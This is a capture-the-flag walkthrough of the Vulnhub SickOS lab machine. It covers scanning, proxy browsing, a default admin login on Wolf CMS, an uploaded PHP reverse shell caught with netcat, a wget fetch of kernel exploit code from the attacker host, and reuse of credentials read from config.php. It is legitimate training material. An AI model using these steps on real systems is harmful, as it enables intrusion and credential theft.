# Vulnhub SickOS 

**My SetUp**
- VMware Workstation Pro
- Kali: 172.16.126.129
- SickOS: 172.16.126.135

(I used NAT for both Machines)

## Nmap

`sudo nmap -vvv -sC -sV 172.16.126.135 -oA sickos`

![nmap](https://user-images.githubusercontent.com/76433661/152642864-d4d8492b-a383-4ce3-a47b-8953aae8d859.png)


Port 22, 3128, and 8080 seemed to be opened.

SSH is usually not worthit unless SSH version is severely outdated, so I decided to move on to port 3128 right away. 

## Checking out Port 3128

In order to check out port 3128 on web browser, little change with the browser network setting has to be made. (I used firefox)

![firefox_proxy_setup](https://user-images.githubusercontent.com/76433661/152642919-401787be-ea0f-4d78-be0c-928dcfb6fc74.png)

Browser has to go through proxy (port 3128) in order to access the page. 

![blehh](https://user-images.githubusercontent.com/76433661/152642953-584290dc-cdef-4845-8b82-8d76bba55bb8.png)

I could only see the ugly `blehhh` on the page so I tried looking for more directories. 

I always check out `robots.txt` first and it seemed like there is a page running `wolfcms`.

Now I moved to `172.16.126.135/wolfcms`.

![wolfcms](https://user-images.githubusercontent.com/76433661/152643029-11dd67b4-b782-499b-8248-8f34bc591b15.png)

Before searching for vulnerbilities for wolfcms, I wanted to see if there are more hidden directories, so I ran `dirb`.

Dirb needs to go through proxy so used the command below.

`dirb http://172.16.126.135/wolfcms -p 172.16.126.135:3128`

But nothing special showed up. 

After doing some researches, I decided to use exploit from [Arbitrary File Upload Vuln](https://www.exploit-db.com/exploits/38000).

I found out there is an admin page at `172.16.126.135/?/admin`.

![login](https://user-images.githubusercontent.com/76433661/152643116-c9dcd892-8369-4da1-b034-dc7e685c2816.png)

Even before trying bruteforcing, I tired `admin;admin` and it worked right away.

![main](https://user-images.githubusercontent.com/76433661/152643172-f65d45f7-c63a-46cf-bcfc-4012c788c053.png)

## Exploitation

Now that I am inside the system, only thing I need to do is to upload arbitrary PHP file, and capture the reverse shell with the nc command. 

I used [pentestmonkey php revershell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) to upload my code on the system.

And my Kali machine was waiting to capture the signal with the command `nc -lvp 1234`

After that, I went to PHP file link through browser using the following link `http://172.16.126.135/wolfcms/public/shell.php`.

Now I checked my kali terminal, and I had a shell popped open. 

![shell](https://user-images.githubusercontent.com/76433661/152643328-bd97c07c-0dfb-4923-b709-9a4e67290be9.png)

## Getting the root access

Now that I have a working shell, I need to gain root access. 

At first, I thought this is a privilege escalation problem so I researched lot about Kernel exploitation. I donwloaded two exploit from exploit-db.com, and copied the file over to `/tmp` folder using `python3 -m http.server` and `wget http://172.16.126.129:8000/exploit.c`.

However, after several tries, I found out I am stuck and moved on to different perspective.

I moved my directory to `/var/www/wolfcms` to see what information I can find. 

![ls_wolfcms](https://user-images.githubusercontent.com/76433661/152644770-c0ecb483-5b6a-46ef-aca9-01ec68447f41.png)

I took a look at `config.php` file, and there was mysql username and password. *findout the password and username byyouself*

Now that I have potential username and password, I tried `ssh`.

I first tried the username `root`, but it was not it, so I tired the username `sickos`, which worked out. 

![ssh](https://user-images.githubusercontent.com/76433661/152644825-81891229-0ae7-4973-a5f8-db0a728a75c0.png)

I changed the user by `sudo su root`

Moved my working directory to `/root` and found the flag. 

![end](https://user-images.githubusercontent.com/76433661/152644896-43482539-fcda-4920-b988-48db3dac8ea8.png)

